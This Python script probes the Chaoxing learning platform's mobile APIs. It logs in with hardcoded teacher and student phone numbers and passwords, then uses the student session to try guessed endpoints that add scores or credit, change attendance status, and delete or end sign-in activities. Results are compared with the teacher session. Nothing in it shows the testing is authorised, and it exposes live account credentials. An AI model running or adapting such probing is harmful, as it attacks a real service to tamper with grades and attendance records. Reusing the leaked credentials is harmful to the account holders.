#!/usr/bin/env python3
"""
超星学习通 - 第7轮探索: 针对500端点的精准参数测试
关键发现: /ppt/activeAPI/classroomCredit 和 /ppt/activeAPI/addScore 返回500(非404)
说明这些端点存在，但参数格式不对
"""

import requests
import json
import re
import time
import urllib3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

AES_KEY = "u2oh6Vu^HWe4_AES"
AES_IV = AES_KEY

def aes_enc(text):
    key = AES_KEY.encode()
    iv = AES_IV.encode()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(text.encode(), 16)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode()

def get_mobile_ua():
    return ("Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 "
            "ChaoXingStudy/ChaoXingStudy_3_6.1_android_phone_202204251840_27")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={
        "fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
        "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
        "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
        "independentId": "0", "independentNameId": "0"
    }, allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def main():
    results = {}
    print("=" * 80)
    print("超星学习通 - 第7轮探索: 针对500端点的精准参数测试")
    print("=" * 80)

    # === 登录 ===
    print("\n[*] 登录...")
    t_session, t_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    教师PUID: {t_puid}")
    s_session, s_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    学生PUID: {s_puid}")

    # === 获取活动列表 ===
    print("\n[*] 获取活动列表...")
    try:
        r = t_session.get(f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={t_puid}", timeout=20, verify=False)
        active_data = r.json()
        active_list = active_data.get("activeList", [])
        for item in active_list:
            print(f"  活动: id={item.get('id')}, type={item.get('activeType')}, name={item.get('nameOne', 'N/A')}, status={item.get('status')}")
    except Exception as e:
        print(f"  获取活动列表失败: {e}")
        active_list = []

    # 获取所有签到活动ID
    sign_aids = [item.get("id") for item in active_list if item.get("activeType") == 2 or "sign" in str(item.get("url", "")).lower()]
    all_aids = [item.get("id") for item in active_list]
    test_aid = sign_aids[0] if sign_aids else "5000163776552"
    print(f"\n  使用测试活动ID: {test_aid}")
    print(f"  所有签到活动ID: {sign_aids}")
    print(f"  所有活动ID: {all_aids}")

    # =============================================
    # 第1部分: /ppt/activeAPI/classroomCredit 参数测试
    # =============================================
    print("\n" + "=" * 80)
    print("第1部分: /ppt/activeAPI/classroomCredit 参数测试")
    print("=" * 80)

    credit_params = [
        # GET方式 - 不同参数组合
        {"courseId": COURSE_ID, "classId": CLASS_ID},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": t_puid},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "activeId": str(test_aid)},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeId": str(test_aid)},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "type": "1"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "view": "json"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "status": "1"},
        # POST方式
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "credit": "5"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "point": "5"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "credit": "5", "activeId": str(test_aid)},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid)},
        # 教师端
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": t_puid},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": t_puid, "credit": "5"},
    ]

    for params in credit_params:
        # GET
        url = "https://mobilelearn.chaoxing.com/ppt/activeAPI/classroomCredit"
        try:
            r = s_session.get(url, params=params, timeout=15, verify=False)
            pstr = "&".join(f"{k}={v}" for k, v in params.items())
            print(f"  GET [{r.status_code}] classroomCredit?{pstr[:60]} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  GET [ERR] classroomCredit: {e}")

        # POST (only for params with credit/score/point)
        if any(k in params for k in ['credit', 'score', 'point']):
            try:
                r = s_session.post(url, data=params, timeout=15, verify=False)
                pstr = "&".join(f"{k}={v}" for k, v in params.items())
                print(f"  POST [{r.status_code}] classroomCredit?{pstr[:60]} (len={len(r.text)}) {r.text[:100]}")
            except Exception as e:
                print(f"  POST [ERR] classroomCredit: {e}")

    # =============================================
    # 第2部分: /ppt/activeAPI/addScore 参数测试
    # =============================================
    print("\n" + "=" * 80)
    print("第2部分: /ppt/activeAPI/addScore 参数测试")
    print("=" * 80)

    score_params = [
        # 基本参数
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid)},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid), "type": "1"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid), "DB_STRATEGY": "PRIMARY_KEY"},
        # 不同字段名
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "credit": "5", "activeId": str(test_aid)},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "point": "5", "activeId": str(test_aid)},
        # 教师端
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid)},
        # 不同score值
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "1", "activeId": str(test_aid)},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "0", "activeId": str(test_aid)},
        # 包含更多参数
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid), "fid": "0"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid), "fid": "0", "ut": "s"},
    ]

    for params in score_params:
        url = "https://mobilelearn.chaoxing.com/ppt/activeAPI/addScore"
        # GET
        try:
            r = s_session.get(url, params=params, timeout=15, verify=False)
            pstr = "&".join(f"{k}={v}" for k, v in params.items())
            print(f"  GET [{r.status_code}] addScore?{pstr[:70]} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  GET [ERR] addScore: {e}")

        # POST
        try:
            r = s_session.post(url, data=params, timeout=15, verify=False)
            pstr = "&".join(f"{k}={v}" for k, v in params.items())
            print(f"  POST [{r.status_code}] addScore?{pstr[:70]} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  POST [ERR] addScore: {e}")

    # 教师端测试
    print("\n  教师端测试 addScore:")
    teacher_score_params = [
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid)},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5"},
    ]
    for params in teacher_score_params:
        url = "https://mobilelearn.chaoxing.com/ppt/activeAPI/addScore"
        try:
            r = t_session.get(url, params=params, timeout=15, verify=False)
            pstr = "&".join(f"{k}={v}" for k, v in params.items())
            print(f"  GET [{r.status_code}] addScore?{pstr[:70]} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  GET [ERR] addScore: {e}")
        try:
            r = t_session.post(url, data=params, timeout=15, verify=False)
            pstr = "&".join(f"{k}={v}" for k, v in params.items())
            print(f"  POST [{r.status_code}] addScore?{pstr[:70]} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  POST [ERR] addScore: {e}")

    # =============================================
    # 第3部分: /ppt/activeAPI/ 其他端点测试
    # =============================================
    print("\n" + "=" * 80)
    print("第3部分: /ppt/activeAPI/ 其他端点测试")
    print("=" * 80)

    other_active_api = [
        # 积分/分数相关
        ("updateScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid)}),
        ("setScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid)}),
        ("modifyScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid)}),
        ("giveScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid)}),
        ("addCredit", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "credit": "5", "activeId": str(test_aid)}),
        ("updateCredit", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "credit": "5", "activeId": str(test_aid)}),
        ("setCredit", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "credit": "5", "activeId": str(test_aid)}),
        ("modifyCredit", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "credit": "5", "activeId": str(test_aid)}),
        ("addPoint", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "point": "5", "activeId": str(test_aid)}),
        ("updatePoint", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "point": "5", "activeId": str(test_aid)}),
        # 删除/结束活动
        ("deleteActive", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("delActive", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("endActive", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("stopActive", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("cancelActive", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("removeActive", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        # 活动信息
        ("activeInfo", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("activeDetail", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("getActiveInfo", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        # 签到信息
        ("signInfo", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("signDetail", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("getSignInfo", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("signList", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("stuList", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        # 课堂表现
        ("classroomPerformance", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid}),
        ("performance", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid}),
        ("creditLog", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid}),
        ("scoreLog", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid}),
        ("pointLog", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid}),
    ]

    other_results = []
    for endpoint, params in other_active_api:
        url = f"https://mobilelearn.chaoxing.com/ppt/activeAPI/{endpoint}"
        # GET
        try:
            r = s_session.get(url, params=params, timeout=15, verify=False)
            result = {"endpoint": endpoint, "method": "GET", "status": r.status_code, "text": r.text[:200], "len": len(r.text)}
            other_results.append(result)
            status_mark = "!!!" if r.status_code != 404 else "   "
            print(f"  {status_mark} GET [{r.status_code}] {endpoint} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  GET [ERR] {endpoint}: {e}")

        # POST (for modification endpoints)
        if any(kw in endpoint.lower() for kw in ['add', 'update', 'set', 'modify', 'give', 'delete', 'del', 'end', 'stop', 'cancel', 'remove']):
            try:
                r = s_session.post(url, data=params, timeout=15, verify=False)
                result = {"endpoint": endpoint, "method": "POST", "status": r.status_code, "text": r.text[:200], "len": len(r.text)}
                other_results.append(result)
                status_mark = "!!!" if r.status_code != 404 else "   "
                print(f"  {status_mark} POST [{r.status_code}] {endpoint} (len={len(r.text)}) {r.text[:100]}")
            except Exception as e:
                print(f"  POST [ERR] {endpoint}: {e}")

    # 教师端对比测试(删除/结束相关)
    print("\n  教师端对比测试:")
    teacher_endpoints = [
        ("deleteActive", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("endActive", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("addScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid)}),
        ("classroomCredit", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid}),
    ]
    for endpoint, params in teacher_endpoints:
        url = f"https://mobilelearn.chaoxing.com/ppt/activeAPI/{endpoint}"
        try:
            r = t_session.get(url, params=params, timeout=15, verify=False)
            print(f"  GET [{r.status_code}] 教师-{endpoint} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  GET [ERR] 教师-{endpoint}: {e}")
        try:
            r = t_session.post(url, data=params, timeout=15, verify=False)
            print(f"  POST [{r.status_code}] 教师-{endpoint} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  POST [ERR] 教师-{endpoint}: {e}")

    # =============================================
    # 第4部分: /pptSign/ 端点参数测试
    # =============================================
    print("\n" + "=" * 80)
    print("第4部分: /pptSign/ 端点参数测试")
    print("=" * 80)

    # 之前发现 /pptSign/signDetail 等返回500
    # 可能需要正确的参数格式

    pptsign_tests = [
        # signDetail - 签到详情
        ("signDetail", {"activeId": str(test_aid)}),
        ("signDetail", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("signDetail", {"activeId": str(test_aid), "uid": t_puid}),
        ("signDetail", {"activeId": str(test_aid), "uid": s_puid}),
        # signResult - 签到结果
        ("signResult", {"activeId": str(test_aid)}),
        ("signResult", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        # signList - 签到列表
        ("signList", {"activeId": str(test_aid)}),
        ("signList", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        # deleteSign - 删除签到
        ("deleteSign", {"activeId": str(test_aid)}),
        ("deleteSign", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        # endSign - 结束签到
        ("endSign", {"activeId": str(test_aid)}),
        ("endSign", {"activeId": str(test_aid), "courseId": COURSE_ID, "classId": CLASS_ID}),
        # cancelSign - 取消签到
        ("cancelSign", {"activeId": str(test_aid)}),
        # updateSignStatus - 修改签到状态
        ("updateSignStatus", {"activeId": str(test_aid), "uid": s_puid, "status": "1"}),
        ("updateSignStatus", {"activeId": str(test_aid), "uid": s_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}),
        # updateSignStatusByUids - 批量修改
        ("updateSignStatusByUids", {"activeId": str(test_aid), "uids": s_puid, "status": "1"}),
        ("updateSignStatusByUidsV2", {"activeId": str(test_aid), "uids": s_puid, "status": "1"}),
    ]

    for endpoint, params in pptsign_tests:
        url = f"https://mobilelearn.chaoxing.com/pptSign/{endpoint}"
        # 学生GET
        try:
            r = s_session.get(url, params=params, timeout=15, verify=False)
            status_mark = "!!!" if r.status_code == 200 and len(r.text) > 10 else "   "
            print(f"  {status_mark} 学生GET [{r.status_code}] {endpoint}?{list(params.keys())} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  学生GET [ERR] {endpoint}: {e}")

        # 教师GET (仅关键端点)
        if endpoint in ['deleteSign', 'endSign', 'signDetail', 'signList', 'updateSignStatus', 'updateSignStatusByUids', 'updateSignStatusByUidsV2']:
            try:
                r = t_session.get(url, params=params, timeout=15, verify=False)
                status_mark = "!!!" if r.status_code == 200 and len(r.text) > 10 else "   "
                print(f"  {status_mark} 教师GET [{r.status_code}] {endpoint}?{list(params.keys())} (len={len(r.text)}) {r.text[:100]}")
            except Exception as e:
                print(f"  教师GET [ERR] {endpoint}: {e}")

    # =============================================
    # 第5部分: 尝试不同的签到活动ID
    # =============================================
    print("\n" + "=" * 80)
    print("第5部分: 使用不同签到活动ID测试")
    print("=" * 80)

    # 使用所有可用的签到活动ID
    for aid in sign_aids[:3]:
        print(f"\n  测试活动ID: {aid}")
        # /pptSign/signDetail
        url = f"https://mobilelearn.chaoxing.com/pptSign/signDetail"
        try:
            r = t_session.get(url, params={"activeId": str(aid)}, timeout=15, verify=False)
            print(f"  教师GET [{r.status_code}] signDetail?activeId={aid} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  教师GET [ERR] signDetail: {e}")

        # /ppt/activeAPI/addScore
        url = f"https://mobilelearn.chaoxing.com/ppt/activeAPI/addScore"
        try:
            r = t_session.get(url, params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(aid)}, timeout=15, verify=False)
            print(f"  教师GET [{r.status_code}] addScore?activeId={aid} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  教师GET [ERR] addScore: {e}")

    # =============================================
    # 第6部分: 尝试通过mobilelearn域名下的其他路径
    # =============================================
    print("\n" + "=" * 80)
    print("第6部分: mobilelearn域名下的其他路径")
    print("=" * 80)

    other_paths = [
        # 课堂积分
        f"/ppt/classroomCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/ppt/credit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/ppt/score?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/ppt/point?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        # 课堂互动
        f"/ppt/interaction?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/quiz?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/vote?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/pick?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 签到管理
        f"/ppt/signManage?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/activeManage?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 课堂表现
        f"/ppt/performance?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/ppt/classroomPerformance?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
    ]

    for path in other_paths:
        url = "https://mobilelearn.chaoxing.com" + path
        try:
            r = s_session.get(url, timeout=15, verify=False)
            status_mark = "!!!" if r.status_code == 200 and len(r.text) > 100 else "   "
            print(f"  {status_mark} [{r.status_code}] {path.split('?')[0]} (len={len(r.text)}) {r.text[:80]}")
        except Exception as e:
            print(f"  [ERR] {path.split('?')[0]}: {e}")

    # =============================================
    # 第7部分: 尝试通过data.xxt.aichaoxing.com
    # =============================================
    print("\n" + "=" * 80)
    print("第7部分: data.xxt.aichaoxing.com 探索")
    print("=" * 80)

    data_xxt_urls = [
        f"https://data.xxt.aichaoxing.com/analysis/course/credit?courseId={COURSE_ID}&classId={CLASS_ID}&personid={s_puid}",
        f"https://data.xxt.aichaoxing.com/analysis/course/score?courseId={COURSE_ID}&classId={CLASS_ID}&personid={s_puid}",
        f"https://data.xxt.aichaoxing.com/analysis/course/point?courseId={COURSE_ID}&classId={CLASS_ID}&personid={s_puid}",
        f"https://data.xxt.aichaoxing.com/analysis/course/sign?courseId={COURSE_ID}&classId={CLASS_ID}&personid={s_puid}",
        f"https://data.xxt.aichaoxing.com/analysis/course/active?courseId={COURSE_ID}&classId={CLASS_ID}&personid={s_puid}",
    ]

    for url in data_xxt_urls:
        try:
            r = s_session.get(url, timeout=15, verify=False)
            status_mark = "!!!" if r.status_code == 200 and len(r.text) > 10 else "   "
            print(f"  {status_mark} [{r.status_code}] {url.split('aichaoxing.com')[1][:60]} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  [ERR] {url.split('aichaoxing.com')[1][:60]}: {e}")

    # 保存结果
    results["other_results"] = other_results
    with open("/workspace/credit_delete_round7_results.json", "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2, default=str)

    print(f"\n[*] 结果已保存到 /workspace/credit_delete_round7_results.json")

if __name__ == "__main__":
    main()
